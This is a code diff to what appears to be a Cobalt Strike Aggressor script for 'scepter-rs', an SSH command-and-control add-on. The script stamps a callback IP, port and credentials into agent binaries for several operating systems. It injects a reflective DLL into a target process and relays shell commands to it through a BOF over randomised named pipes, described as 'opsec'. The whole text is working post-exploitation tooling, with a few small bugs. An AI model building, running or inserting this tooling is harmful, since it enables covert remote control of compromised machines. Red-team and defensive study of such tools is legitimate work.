@@ -1,7 +1,8 @@
 import beacon.CommandBuilder;
 
-global('$ssh_inited $server_dll_name $reading_inited $pipe_wait $arch_list $file_ext $pipe_output_name_final $agent_base_name $pipe_input_name_final $pipe_output_stomp_me_name $pipe_input_stomp_me_name $ssh_ip_stomp_me $ssh_ip_connect_stomp_me $ssh_port_stomp_me $ssh_username_stomp_me $ssh_password_stomp_me');
+global('$ssh_inited $server_dll_name $reading_inited $artifacts_inited $pipe_wait $arch_list $file_ext $pipe_output_name_final $agent_base_name $pipe_input_name_final $pipe_output_stomp_me_name $pipe_input_stomp_me_name $ssh_ip_stomp_me $ssh_ip_connect_stomp_me $ssh_port_stomp_me $ssh_username_stomp_me $ssh_password_stomp_me');
 $ssh_inited = -1;
+$artifacts_inited = -1;
 $reading_inited = -1;
 
 println("[SCEPTER] You are now holding the Scepter.")
@@ -10,8 +11,8 @@ println("[SCEPTER] You are now holding the Scepter.")
 # _final are the names that are being stomped into the artifacts
 # _stomp_me_name are the original names in the artifacts that are going to be stomped in either by the globals or by user specified parameters.
 
-$pipe_output_name_final = "BigGasPipe_updater_005"; # Change the pipe name an reload the CNA for 'opsec', 28-bytes MAX
-$pipe_input_name_final = "BigGasPipe_updater_004"; # Change the pipe name an reload the CNA for 'opsec', 28-bytes MAX
+$pipe_output_name_final = "BigGasPipe_updater_00"; # Change the pipe name an reload the CNA for 'opsec', 25-bytes MAX
+$pipe_input_name_final = "BigGasPipe_updater_01"; # Change the pipe name an reload the CNA for 'opsec', 25-bytes MAX
 $interface_ip_final = "0.0.0.0"; # the server can be tightened down to a specific interface by changing this
 
 # Target strings that are stomped
@@ -39,6 +40,11 @@ $os_list = @("linux", "windows", "apple");
 $arch_list = @("aarch64", "x64");
 $file_ext = @("exe", "dll", "bin");
 
+# $1 - string
+sub append_random {
+    return $1 . rand(101);
+}
+
 # $1 - bytes where we are going to do the stoming
 # $2 - string we want to stomp
 # $3 - length of the string we want to stomp (for padding)
@@ -49,6 +55,18 @@ sub stomp-str {
     $stomp_me_string = $2;
     $stomp_me_string_len = $3;
     $output_string = $4;
+
+    if ($output_string is $null){ # if string we're stomping in is null, just stomp in null bytes
+        $null_padding = "";
+        $i = 0;
+        while ($i < $stomp_me_string_len) {
+            $null_padding = $null_padding . chr(0); # Append an actual null byte
+            $i = $i + 1;
+        }
+
+        $output_string = strrep($bytes, $stomp_me_string, $null_padding);
+        return $output_string;
+    }
 
     $padding_needed = $stomp_me_string_len - strlen($output_string);
     $padded_output_string = $output_string;
@@ -62,7 +80,7 @@ sub stomp-str {
         }
         $padded_output_string = $output_string . $null_padding;
     } else if ($padding_needed < 0) {
-        println("[SCEPTER ERROR] Output string of size '" . strlen($output_string) . "' is longer than max " . $stomp_me_string_len . " bytes!");
+        println("String of length " . strlen($output_string) . " is longer than max " . $stomp_me_string_len . " bytes!");
         return; # Important to return if name is too long
     }
     # println("[SCEPTER] ORIGINAL STRING: " . $stomp_me_string);
@@ -74,6 +92,170 @@ sub stomp-str {
     return $output_string;
 }
 
+# $1 - beacon id
+# $2 - target IP address
+# $3 - target port number
+# $4 - username
+# $5 - password
+alias scepter-generate-agents {
+    local('$barch $beacon_id $pid $agent $agent_path $agent_path_out $rdll_path $rdll_path_out $target_ip $target_port $target_username $target_password $rdll $handle $actual_pipe_name $desired_length $null_padding $padding_needed $padded_pipe_name $bof_path $bof_path_out $bof_data');
+    $beacon_id = $1;
+    $target_ip = $2; # ssh server ip
+    $target_port = $3; # ssh server port
+    $target_username = $4;
+    $target_password = $5;
+
+    if($target_ip is $null || $target_password is $null || $target_password is $null){
+        berror($1, "[SCEPTER] Invalid arguments");
+        return;
+    }
+
+    # Get current beacon info
+    $barch = beacon_info($beacon_id, "barch");
+
+    if ($barch != "x64") {
+        berror($1, "[SCEPTER] This script only supports x64 processes");
+        return;
+    }
+
+    if($artifacts_inited > 0){
+        berror($beacon_id , "[SCEPTER] Artifacts already initialized.");
+        return; 
+    }
+
+    # Add random number to the pipe names
+    $pipe_input_name_final = append_random($pipe_input_name_final);
+    $pipe_output_name_final = append_random($pipe_output_name_final);
+
+    # All binaries are stored in bins/
+
+    # Build rdll path; This needs rework if you want to support x86 for whatever reason
+    # The server must have the interface IP, PORT, username, password, input pipe and outputpipe names stomped in 
+    $rdll_path = getFileProper(script_resource("."), "bins", "x64", $server_dll_name);
+
+    $rdll_path_out = getFileProper(script_resource("."), "out", "x64", $server_dll_name);
+
+    # Build bof path; This needs rework if you want to support x86 for whatever reason
+    $bof_path = getFileProper(script_resource("."), "bins", "x64", $bof_write_pipe_name);
+
+    $bof_path_out = getFileProper(script_resource("."), "out", "x64", $bof_write_pipe_name);
+
+    # ex path: bins/x64/scepter_agent.windows.x64.exe
+    # bins/<arch>/<agent base name>.<windows>.<arch>.<file_ext>
+    foreach $arch_item ($arch_list) {
+        foreach $os_item ($os_list) {
+            foreach $ext_item ($file_ext) {
+                $filename = $agent_base_name . "." . $os_item . "." . $arch_item . "." . $ext_item;
+                $agent_path = getFileProper(script_resource("."), "bins", $arch_item, $filename);
+                $agent_path_out = getFileProper(script_resource("."), "out", $arch_item, $filename);
+
+                # println("[SCEPTER] Looking for: ". $agent_path);
+
+                if ( -exists $agent_path ) {
+                    println("[SCEPTER] Found: " . $agent_path);
+
+                    # For all the agent files found, stomp in IP, PORT, username, and password
+
+                    # Get agent contents
+                    $handle = openf($agent_path);
+                    $agent = readb($handle, -1);
+
+                    # Close handle
+                    closef($handle);
+
+                    # Agent STOMP Username that we want to use to try to authenticate to the SSH server  #
+                    # Now use $ssh_username_stomp_me in strrep
+                    $agent = stomp-str($agent, $ssh_username_stomp_me, "64", $target_username);
+
+                    # Agent STOMP Password that we want to use to try to authenticate to the SSH server  #
+                    # Now use $ssh_password_stomp_me in strrep
+                    $agent = stomp-str($agent, $ssh_password_stomp_me, "64", $target_password);
+
+                    # Agent STOMP Port that will host the SSH Service
+                    $agent = stomp-str($agent, $ssh_port_stomp_me, "5", $target_port);
+
+                    # Agent use $ssh_ip_connect_stomp_me in strrep
+                    $agent = stomp-str($agent, $ssh_ip_connect_stomp_me, "15", $target_ip);
+
+                    # Open output handle
+                    $handle = openf(">" . $agent_path_out);
+
+                    # Write rdll back down
+                    writeb($handle, $agent);
+
+                    # Close handle
+                    closef($handle);
+                }
+            }
+        }
+    }
+
+    # Resolve the output directories now as well
+
+    # Get rdll contents
+    $handle = openf($rdll_path);
+    $rdll = readb($handle, -1);
+
+    # Close handle
+    closef($handle);
+
+    # Now use $ssh_ip_stomp_me in strrep
+    $rdll = stomp-str($rdll, $ssh_ip_stomp_me, "15", $interface_ip_final);
+
+    # RDLL STOMP Username that we want to use to try to authenticate to the SSH server  #
+    # Now use $ssh_username_stomp_me in strrep
+    $rdll = stomp-str($rdll, $ssh_username_stomp_me, "64", $target_username);
+
+    # RDLL STOMP Password that we want to use to try to authenticate to the SSH server  #
+    # Now use $ssh_password_stomp_me in strrep
+    $rdll = stomp-str($rdll, $ssh_password_stomp_me, "64", $target_password);
+
+    # RDLL STOMP INPUT PIPE, this is the pipe we use to send commands that are forwarded to the rdll to the target  #
+    # Now use $pipe_input_stomp_me_name in strrep
+    $rdll = stomp-str($rdll, $pipe_input_stomp_me_name, "29", $pipe_input_name_final);
+
+    # RDLL STOMP OUTPUT PIPE, this is the pipe we use to send commands that are forwarded to the rdll to the target   #
+    # Now use $pipe_input_stomp_me_name in strrep
+    $rdll = stomp-str($rdll, $pipe_output_stomp_me_name, "30", $pipe_output_name_final);
+
+    # RDLL STOMP Port that will host the SSH Service
+    $rdll = stomp-str($rdll, $ssh_port_stomp_me, "5", $target_port);
+
+    println("[SCEPTER] Writing server dll: " . $rdll_path_out);
+
+    # Open output handle
+    $handle = openf(">" . $rdll_path_out);
+
+    # Write rdll back down
+    writeb($handle, $rdll);
+
+    # Close handle
+    closef($handle);
+
+    # BOF STOMP INPUT PIPE, this is the pipe we use to send commands that are forwarded to the rdll to the target #
+    # Get BOF contents
+    $handle = openf($bof_path);
+    $bof_data = readb($handle, -1);
+
+    # Close handle
+    closef($handle);
+
+    # Now use $pipe_input_stomp_me_name in strrep
+    $bof_data = stomp-str($bof_data, $pipe_input_stomp_me_name, "29", $pipe_input_name_final);
+
+    # Open output handle
+    $handle = openf(">" . $bof_path_out);
+
+    # Write BOF back down
+    writeb($handle, $bof_data);
+
+    # Close handle
+    closef($handle);
+
+    $artifacts_inited = 1;
+
+    println("[SCEPTER] Artifacts generated into " . getFileProper(script_resource(".")) . "out" . " directory.");
+}
 
 # $1 - beacon id
 # $2 - target IP address
@@ -90,13 +272,13 @@ alias scepter-init {
     $target_password = $5;
     $pid = $6; # optional PID
 
-    if($ssh_inited > 0){
-        berror($1, "[SCEPTER] SSH Server already initialized");
-        return;    
-    }
-
     if($target_ip is $null || $target_password is $null || $target_password is $null){
         berror($1, "[SCEPTER] Invalid arguments");
+        return;
+    }
+
+    if($ssh_inited > 0){
+        berror($1, "[SCEPTER] SSH server is already initiated.");
         return;
     }
 
@@ -114,7 +296,11 @@ alias scepter-init {
     }
 
     blog($beacon_id, "[SCEPTER] Starting SSH server on " . $interface_ip_final . ":" . $target_port . " in process " . $pid . ".");
-    blog($beacon_id, "[SCEPTER] Starting SSH clients will try to connect to " . $target_ip . ":" . $target_port . ".");
+    blog($beacon_id, "[SCEPTER] Starting SSH clients ( " . getFileProper(script_resource("."), "out") . " ) will try to connect to " . $target_ip . ":" . $target_port . ".");
+
+    # Add random number to the pipe names
+    $pipe_input_name_final = append_random($pipe_input_name_final);
+    $pipe_output_name_final = append_random($pipe_output_name_final);
 
     # All binaries are stored in bins/
 
@@ -245,7 +431,7 @@ alias scepter-init {
     bshinject($beacon_id, $pid, $barch, $rdll_path_out);
 
     $ssh_inited = 1;
-    
+
     println("[SCEPTER] SSH server initiated.");
 }
 
@@ -260,7 +446,7 @@ sub scepter-read {
     $description = "pipe read";
 
     if($ssh_inited < 0){
-        berror($1, "You must init ssh first. Try: ssh-init <target ip> <username> <password> <optional: pid>");
+        berror($1, "[SCEPTER] You must init ssh first. Try: ssh-init <target ip> <username> <password> <optional: pid>");
         return;
     }
 
@@ -268,7 +454,7 @@ sub scepter-read {
     $barch = beacon_info($beacon_id, "barch");
 
     if ($barch != "x64") {
-        berror($1, "This script only supports x64 processes");
+        berror($1, "[SCEPTER] This script only supports x64 processes");
         return;
     }
 
@@ -292,12 +478,12 @@ sub scepter-read {
 # $1 - beacon id
 # $2 - data to send to agent (shell command)
 alias scepter-exec {
-    local('$beacon_id $data $bof $args $bof_path $handle $bof_data');
+    local('$bid $data $bof $args $bof_path $handle $bof_data');
     $beacon_id = $1;
     $data = $2;
 
     if($ssh_inited < 0){
-        berror($beacon_id, "[SCEPTER] You must init ssh first. Try: ssh-init <target ip> <username> <password> <optional: pid>")
+        berror($beacon_id, "You must init ssh first. Try: ssh-init <target ip> <username> <password> <optional: pid>")
         return;
     }
 
@@ -314,31 +500,30 @@ alias scepter-exec {
     # execute it.
     beacon_inline_execute($beacon_id, $bof_data, "go", $args);
 
-    if($reading_inited < 0){
-        # give the pipes a couple of seconds to initialize
-        sleep(2 * 1000);
+        if($reading_inited < 0){
+        # give the bof a couple of seconds to write the data to the pipe
+
+        bpause($beacon_id, 5 * 1000);
 
         # read from the output pipe
         scepter-read($beacon_id, $null);
 
         $reading_inited = 1;
-
     }
-    
 }
 
 # $1 - beacon id
 alias scepter-exit {
-    local('$beacon_id $data $bof $args $bof_path $handle $bof_data');
-    $beacon_id = $1;
+    local('$bid $data $bof $args $bof_path $handle $bof_data');
+    $bid = $1;
     $data = "exit";
 
     if($ssh_inited < 0){
-        berror($beacon_id, "[SCEPTER] You must init ssh first. Try: ssh-init <target ip> <username> <password> <optional: pid>");
+        berror($bid, "[SCEPTER] You must init ssh first. Try: ssh-init <target ip> <username> <password> <optional: pid>")
         return;
     }
 
-    $args = bof_pack($beacon_id, "z", $data);
+    $args = bof_pack($bid, "z", $data);
 
     # Build bof path; This needs rework if you want to support x86 for whatever reason
     $bof_path = getFileProper(script_resource("."), "out", "x64", $bof_write_pipe_name);
@@ -349,14 +534,10 @@ alias scepter-exit {
     closef($handle);
 
     # execute it.
-    beacon_inline_execute($beacon_id, $bof_data, "go", $args);
+    beacon_inline_execute($bid, $bof_data, "go", $args);
 
-    # give the bof a couple of seconds to write the data to the pipe
-    sleep(2 * 1000);
-    
-    # reset globals
-    $reading_inited = -1;
     $ssh_inited = -1;
+    $reading_inited = -1;
 }
 
 # --------------------
@@ -364,13 +545,13 @@ alias scepter-exit {
 # --------------------
 beacon_command_group(
 	"scepter-rs",
-	"User-Defined SSH Interface",
+	"User-Defined SSH C2 Interface",
 	"User-implemented reflective DLL that provdes SSH Server functionality so that Agents can connect to the server.\nUsers can then interact with those agents via custom commands in the Beacon console."
 );
 
 beacon_command_register(
 	"scepter-init",
-	"(64-bit only) Initializes RDLL and BOF to start SSH Server on the target host.",
+	"(64-bit only) Initializes RDLL and BOF to start SSH Scepter Server on the target host, and builds Agents for use.",
 	"scepter-init <target ip> <target-port> <username> <password> <optional: pid>\nex: scepter-init 192.0.0.1 2222 my_username my_password 12345",
 	"scepter-rs"
 );
@@ -386,5 +567,12 @@ beacon_command_register(
 	"scepter-exit",
 	"(64-bit only) Uses a bof to write the exit command to a pipe that is read by a user implemented reflective DLL. SSH Server exits.",
 	"scepter-exit",
+	"scepter-rs"
+);
+
+beacon_command_register(
+	"scepter-generate-agents",
+	"(64-bit only) Builds Agent binaries with configuration specified in .cna without starting the SSH Scepter Server.",
+	"scepter-generate-agents <target ip> <target-port> <username> <password>\nex: scepter-generate-agents 192.0.0.1 2222 my_username my_password",
 	"scepter-rs"
 );
